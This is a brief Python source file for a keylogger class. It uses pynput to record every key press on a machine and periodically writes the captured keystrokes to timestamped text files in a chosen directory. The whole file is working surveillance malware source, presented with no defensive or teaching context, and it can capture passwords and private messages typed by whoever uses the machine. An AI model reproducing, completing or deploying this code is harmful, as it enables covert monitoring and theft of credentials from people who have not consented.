import pynput.keyboard
import threading
import os
from datetime import datetime

class Keylogger:
    def __init__(self, time_interval, log_directory):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.log_directory = log_directory

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.save_log_to_file()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_log_to_file(self):
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"keylog_{current_time}.txt"
        file_path = os.path.join(self.log_directory, file_name)
        with open(file_path, 'w') as file:
            file.write(self.log)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

